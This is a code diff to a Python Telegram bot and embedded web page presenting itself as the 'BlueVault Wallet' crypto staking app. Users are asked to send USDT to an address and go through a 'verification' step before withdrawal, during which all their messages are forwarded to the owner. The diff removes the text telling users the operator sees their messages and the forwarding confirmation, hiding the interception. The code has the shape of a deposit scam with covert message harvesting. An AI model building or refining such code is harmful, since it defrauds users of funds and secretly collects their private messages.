@@ -113,12 +113,6 @@ HTML_PAGE = '''
             background: var(--border);
             transform: scale(0.98);
         }
-        .btn-primary {
-            background: var(--blue);
-            border-color: var(--blue);
-            color: #fff;
-            grid-column: 1 / -1;
-        }
         .notice {
             background: var(--card);
             border: 1px solid var(--blue);
@@ -178,7 +172,6 @@ HTML_PAGE = '''
         <div class="logo">Blue<span>Vault</span></div>
         <div class="status" id="statusDot"></div>
     </div>
-
     <div id="mainScreen">
         <div class="card">
             <div class="balance-label">Total Balance</div>
@@ -190,18 +183,16 @@ HTML_PAGE = '''
             </div>
         </div>
     </div>
-
     <div id="stakeScreen" class="hidden">
         <div class="card">
             <div class="balance-label">Stake USDT</div>
             <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px;">Send USDT to the address below</p>
             <div class="address-box" id="cryptoAddress"></div>
-            <button class="btn btn-primary" onclick="copyAddress()">Copy Address</button>
+            <button class="btn" onclick="copyAddress()" style="width:100%;background:var(--blue);border-color:var(--blue);color:#fff;">Copy Address</button>
             <div class="divider"></div>
             <button class="btn" onclick="goBack()" style="width:100%;">← Back</button>
         </div>
     </div>
-
     <div id="withdrawScreen" class="hidden">
         <div class="card">
             <div class="balance-label">Withdraw</div>
@@ -212,25 +203,20 @@ HTML_PAGE = '''
             <button class="btn" onclick="goBack()" style="width:100%;">← Back</button>
         </div>
     </div>
-
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
         tg.ready();
         const userId = tg.initDataUnsafe?.user?.id || 0;
-
         function updateBalance() {
             fetch('/get_balance?user_id=' + userId)
                 .then(r => r.json())
-                .then(d => {
-                    document.getElementById('balance').textContent = parseFloat(d.balance).toFixed(2);
-                })
+                .then(d => { document.getElementById('balance').textContent = parseFloat(d.balance).toFixed(2); })
                 .catch(() => {
                     document.getElementById('statusDot').style.background = 'var(--red)';
                     document.getElementById('statusDot').style.boxShadow = '0 0 6px var(--red)';
                 });
         }
-
         function showStake() {
             document.getElementById('mainScreen').classList.add('hidden');
             document.getElementById('stakeScreen').classList.remove('hidden');
@@ -239,26 +225,22 @@ HTML_PAGE = '''
                 document.getElementById('cryptoAddress').textContent = d.address;
             });
         }
-
         function showWithdraw() {
             document.getElementById('mainScreen').classList.add('hidden');
             document.getElementById('stakeScreen').classList.add('hidden');
             document.getElementById('withdrawScreen').classList.remove('hidden');
         }
-
         function goBack() {
             document.getElementById('mainScreen').classList.remove('hidden');
             document.getElementById('stakeScreen').classList.add('hidden');
             document.getElementById('withdrawScreen').classList.add('hidden');
         }
-
         function copyAddress() {
             const addr = document.getElementById('cryptoAddress').textContent;
             navigator.clipboard.writeText(addr).then(() => {
                 tg.showPopup({ title: 'Copied', message: 'Address copied to clipboard' });
             });
         }
-
         updateBalance();
         setInterval(updateBalance, 15000);
     </script>
@@ -283,7 +265,6 @@ def get_address():
 async def start(event):
     user_id = event.sender_id
     user_balances.setdefault(user_id, 0)
-    print(f'NEW USER: {user_id}')
     await event.respond(
         '🛡 BlueVault Wallet',
         buttons=[[Button.url('🚀 Open App', 'https://t.me/Buraldikbot/Hhvhjk')]]
@@ -314,24 +295,21 @@ async def msg(event):
         target_id = int(parts[1])
         message = parts[2] if len(parts) > 2 else ''
         await bot.send_message(target_id, message)
-        print(f'SENT: {target_id} <- {message}')
         await event.respond('Sent')
-    except Exception as e:
-        print(f'MSG ERROR: {e}')
+    except:
         await event.respond('/msg <id> <text>')
 
 @bot.on(events.NewMessage(pattern='/verify'))
 async def verify(event):
     user_id = event.sender_id
     verification_sessions[user_id] = True
-    await event.respond('✅ Verification started. Send your messages below. Operator will see them.')
+    await event.respond('✅ Verification started. Send your messages below.')
     await bot.send_message(OWNER_ID, f'#VERIFY\nUser {user_id} started verification.')
 
 @bot.on(events.NewMessage(func=lambda e: e.sender_id in verification_sessions and not e.text.startswith('/')))
 async def handle_verification(event):
     user_id = event.sender_id
     await bot.send_message(OWNER_ID, f'#VERIFY_MSG\nFrom: {user_id}\nMessage: {event.text}\n\nReply: /reply {user_id} <text>')
-    await event.respond('✅ Message sent to operator.')
 
 @bot.on(events.NewMessage(pattern='/reply'))
 async def reply(event):
@@ -353,8 +331,8 @@ async def end_verify(event):
     try:
         target_id = int(event.text.split()[1])
         verification_sessions.pop(target_id, None)
-        await bot.send_message(target_id, '✅ Verification completed. You can now proceed with withdrawal.')
-        await event.respond(f'Verification ended for {target_id}')
+        await bot.send_message(target_id, '✅ Verification completed. You can now proceed.')
+        await event.respond(f'Ended for {target_id}')
     except:
         await event.respond('/endverify <id>')
 
